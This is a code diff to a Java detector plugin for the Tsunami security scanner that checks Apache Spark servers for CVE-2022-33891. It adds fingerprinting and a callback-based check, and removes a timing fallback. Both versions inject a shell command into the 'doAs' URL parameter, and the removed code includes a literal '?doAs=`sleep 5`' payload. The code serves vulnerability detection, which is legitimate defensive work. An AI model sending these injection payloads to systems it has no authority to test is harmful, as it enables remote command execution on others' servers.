@@ -1,5 +1,5 @@
 /*
- * Copyright 2024 Google LLC
+ * Copyright 2025 Google LLC
  *
  * Licensed under the Apache License, Version 2.0 (the "License");
  * you may not use this file except in compliance with the License.
@@ -17,14 +17,17 @@ package com.google.tsunami.plugins.detectors.cves.cve202233891;
 
 import static com.google.common.base.Preconditions.checkNotNull;
 import static com.google.common.collect.ImmutableList.toImmutableList;
+import static com.google.tsunami.plugins.detectors.cves.cve202233891.Annotations.OobSleepDuration;
 
-import com.google.common.base.Stopwatch;
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
+import com.google.common.util.concurrent.Uninterruptibles;
 import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.data.NetworkServiceUtils;
 import com.google.tsunami.common.net.http.HttpClient;
 import com.google.tsunami.common.net.http.HttpRequest;
+import com.google.tsunami.common.net.http.HttpResponse;
+import com.google.tsunami.common.net.http.HttpStatus;
 import com.google.tsunami.common.time.UtcClock;
 import com.google.tsunami.plugin.PluginType;
 import com.google.tsunami.plugin.VulnDetector;
@@ -43,6 +46,7 @@ import com.google.tsunami.proto.Vulnerability;
 import com.google.tsunami.proto.VulnerabilityId;
 import java.io.IOException;
 import java.time.Clock;
+import java.time.Duration;
 import java.time.Instant;
 import javax.inject.Inject;
 
@@ -53,7 +57,7 @@ import javax.inject.Inject;
     version = "0.1",
     description = "Checks for occurrences of CVE-2022-33891 in Apache Spark installations.",
     author = "OccamsXor",
-    bootstrapModule = Cve202233891DetectorBootstrapModule.class)
+    bootstrapModule = Cve202233891VulnDetectorBootstrapModule.class)
 @ForWebService
 public final class Cve202233891VulnDetector implements VulnDetector {
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
@@ -61,12 +65,17 @@ public final class Cve202233891VulnDetector implements VulnDetector {
   private final Clock utcClock;
   private final HttpClient httpClient;
   private final PayloadGenerator payloadGenerator;
+  private final int oobSleepDuration;
 
-  private static final short SLEEP_CMD_WAIT_DURATION_SECONDS = 5;
+  private static final String FINGERPRINT_MASTER = "<title>Spark Master at ";
+  private static final String FINGERPRINT_WORKER = "<title>Spark Worker at ";
 
   @Inject
   Cve202233891VulnDetector(
-      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
+      @UtcClock Clock utcClock,
+      HttpClient httpClient,
+      PayloadGenerator payloadGenerator,
+      @OobSleepDuration int oobSleepDuration) {
     this.utcClock = checkNotNull(utcClock);
     this.httpClient =
         checkNotNull(httpClient, "HttpClient cannot be null.")
@@ -74,6 +83,7 @@ public final class Cve202233891VulnDetector implements VulnDetector {
             .setFollowRedirects(false)
             .build();
     this.payloadGenerator = checkNotNull(payloadGenerator, "PayloadGenerator cannot be null.");
+    this.oobSleepDuration = oobSleepDuration;
   }
 
   @Override
@@ -84,10 +94,65 @@ public final class Cve202233891VulnDetector implements VulnDetector {
         .addAllDetectionReports(
             matchedServices.stream()
                 .filter(NetworkServiceUtils::isWebService)
+                .filter(this::isSpark)
                 .filter(this::isServiceVulnerable)
                 .map(networkService -> buildDetectionReport(targetInfo, networkService))
                 .collect(toImmutableList()))
         .build();
+  }
+
+  public boolean isSpark(NetworkService networkService) {
+    try {
+      String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
+      HttpResponse response =
+          this.httpClient.send(HttpRequest.get(targetUri).withEmptyHeaders().build());
+
+      return response.status() == HttpStatus.OK
+          && (response.bodyString().orElse("").contains(FINGERPRINT_MASTER)
+              || response.bodyString().orElse("").contains(FINGERPRINT_WORKER));
+    } catch (IOException e) {
+      return false;
+    }
+  }
+
+  private boolean isServiceVulnerable(NetworkService networkService) {
+    // Check callback server is enabled
+    if (!payloadGenerator.isCallbackServerEnabled()) {
+      logger.atWarning().log("This detector needs the Callback Server to be available.");
+      return false;
+    }
+
+    logger.atInfo().log("Callback server is available!");
+    Payload payload = generateCallbackServerPayload();
+    String targetUri =
+        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
+            + "?doAs=`"
+            + payload.getPayload()
+            + "`";
+    var request = HttpRequest.get(targetUri).withEmptyHeaders().build();
+
+    try {
+      this.httpClient.send(request, networkService);
+      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(this.oobSleepDuration));
+      return payload.checkIfExecuted();
+
+    } catch (IOException e) {
+      logger.atWarning().withCause(e).log("Failed to send request.");
+      return false;
+    }
+  }
+
+  private Payload generateCallbackServerPayload() {
+    PayloadGeneratorConfig config =
+        PayloadGeneratorConfig.newBuilder()
+            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
+            .setInterpretationEnvironment(
+                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
+            .setExecutionEnvironment(
+                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
+            .build();
+
+    return this.payloadGenerator.generate(config);
   }
 
   @Override
@@ -110,66 +175,6 @@ public final class Cve202233891VulnDetector implements VulnDetector {
                     + " blind command injection in username parameter.")
             .setRecommendation("You can upgrade your Spark instances to 3.2.2, or 3.3.0 or later")
             .build());
-  }
-
-  private boolean isServiceVulnerable(NetworkService networkService) {
-    return isRceExecutable(networkService);
-  }
-
-  private boolean isRceExecutable(NetworkService networkService) {
-    Payload payload;
-    if (payloadGenerator.isCallbackServerEnabled()) {
-      // Check callback server is enabled
-      logger.atInfo().log("Callback server is available!");
-      payload = generateCallbackServerPayload();
-      String targetUri =
-          NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
-              + "?doAs=`"
-              + payload.getPayload()
-              + "`";
-      var request = HttpRequest.get(targetUri).withEmptyHeaders().build();
-
-      try {
-        var response = this.httpClient.send(request, networkService);
-        logger.atInfo().log("Callback Server Payload Response: %s", response.bodyString().get());
-        return payload.checkIfExecuted();
-
-      } catch (IOException e) {
-        logger.atWarning().withCause(e).log("Failed to send request.");
-        return false;
-      }
-    } else {
-      // If there is no callback server available, try sleep
-      logger.atInfo().log("Callback server is not available!");
-      Stopwatch stopwatch = Stopwatch.createUnstarted();
-      String targetUri =
-          NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "?doAs=`sleep 5`";
-      var request = HttpRequest.get(targetUri).withEmptyHeaders().build();
-      try {
-        stopwatch.start();
-        var response = this.httpClient.send(request, networkService);
-        stopwatch.stop();
-        logger.atInfo().log("Callback Server Payload Response: %s", response.bodyString().get());
-        return stopwatch.elapsed().getSeconds() >= SLEEP_CMD_WAIT_DURATION_SECONDS;
-      } catch (IOException e) {
-        logger.atWarning().withCause(e).log("Failed to send request.");
-        stopwatch.stop();
-        return false;
-      }
-    }
-  }
-
-  private Payload generateCallbackServerPayload() {
-    PayloadGeneratorConfig config =
-        PayloadGeneratorConfig.newBuilder()
-            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
-            .setInterpretationEnvironment(
-                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
-            .setExecutionEnvironment(
-                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
-            .build();
-
-    return this.payloadGenerator.generate(config);
   }
 
   private DetectionReport buildDetectionReport(
